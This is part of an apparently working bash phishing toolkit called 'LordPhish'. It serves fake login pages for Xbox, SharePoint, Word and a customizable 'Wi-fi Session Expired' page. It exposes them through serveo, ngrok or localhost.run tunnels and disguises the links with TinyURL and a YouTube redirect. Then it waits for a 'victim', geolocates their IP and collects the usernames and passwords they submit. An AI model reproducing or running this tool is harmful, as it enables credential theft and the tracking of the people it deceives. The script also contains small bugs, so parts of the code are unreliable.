server="sharepoint"
start1

elif [[ $ofice_menu == 5 ]]; then
server="word"
start1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}

microsoft () {
    banner
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m XBOX\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Windows Store\e[0m\n"
    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' op_menu
    
if [[ $op_menu == 1 ]]; then
server="xbox"
start1
    
elif [[ $op_menu == 2 ]]; then
server"Microsoft"
start1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}

createpage() {
default_cap1="Wi-fi Session Expired"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > webpages/create/login.html
echo "<html>" >> webpages/create/login.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> webpages/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> webpages/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> webpages/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> webpages/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> webpages/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> webpages/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> webpages/create/login.html
printf '</center>' >> webpages/create/login.html
printf '<body>\n' >> webpages/create/login.html
printf '</html>\n' >> webpages/create/login.html


}

catch_cred() {

account=$(grep -o 'Account:.*' webpages/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' webpages/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat webpages/$server/usernames.txt >> webpages/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m webpages/%s/saved.usernames.txt\e[0m\n" $server
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
exit 1

}

getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
while [ true ]; do


if [[ -e ".sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred

fi
sleep 1
done


}

catch_ip() {
touch webpages/$server/saved.usernames.txt
ip=$(grep -a 'IP:' webpages/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' webpages/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat webpages/$server/ip.txt >> webpages/$server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}
start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi


printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Localhost Run\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Localhost\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == 1 || $option_server == 01 ]]; then
startx

elif [[ $option_server == 2 || $option_server == 02 ]]; then
start
elif [[ $option_server == 3 || $option_server == 03 ]]; then
start_local
elif [[ $option_server == 4 || $option_server == 04 ]]; then
start_l
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}
start_l() {
def_port="5555"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
cd webpages/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://localhost:$port\e[0m\n"
printf "\n"
checkfound
}
start_local(){
def_port="5555"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
cd webpages/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ..\e[0m\n"
printf "\n"
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Ctrl + C to view Login Info.Press it After the Victim Opened It.\e[0m\n"
printf "\e[1;93m\n"
ssh -R 80:localhost:$port ssh.localhost.run 2>&1
printf "\e[0m\n"
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Login Info..\e[0m\n"
while [ true ]; do
if [[ -e "webpages/$server/ip.txt" ]]; then
c_ip
rm -rf webpages/$server/ip.txt
fi
sleep 0.75
if [[ -e ".sites/$server/usernames.txt" ]]; then
account=$(grep -o 'Username:.*' webpages/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' webpages/$server/usernames.txt | cut -d ":" -f2)
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat webpages/$server/usernames.txt >> webpages/$server/login_info.txt
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/%s/login_info.txt\e[0m\n" $server
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
rm -rf webpages/$server/usernames.txt
fi
sleep 0.75
done
}

##
serverx() {
printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd webpages/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
if [[ -e .sendlink ]]; then
rm -rf .sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 10 # &
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
checkfound


}

startx() {
if [[ -e webpages/$server/ip.txt ]]; then
rm -rf webpages/$server/ip.txt

fi
if [[ -e webpages/$server/usernames.txt ]]; then
rm -rf webpages/$server/usernames.txt

fi

default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
serverx

}


##

start() {
if [[ -e webpages/$server/ip.txt ]]; then
rm -rf webpages/$server/ip.txt

fi
if [[ -e webpages/$server/usernames.txt ]]; then
rm -rf webpages/$server/usernames.txt

fi

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd webpages/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"

checkfound
}


checkfound() {

printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ctrl + c to exit...\e[0m\n"
while [ true ]; do


if [[ -e "webpages/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip
rm -rf webpages/$server/ip.txt
fi
sleep 0.5
if [[ -e "webpages/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred
rm -rf webpages/$server/usernames.txt
fi
if [[ -e "webpages/$server/saved.ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip
rm -rf .sites/$server/saved.ip.txt
fi
sleep 0.5
if [[ -e "webpages/$server/saved.usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred
rm -rf webpages/$server/saved.usernames.txt
fi
sleep 0.5
done

}
UnzipFiles
banner
dependencies
menu
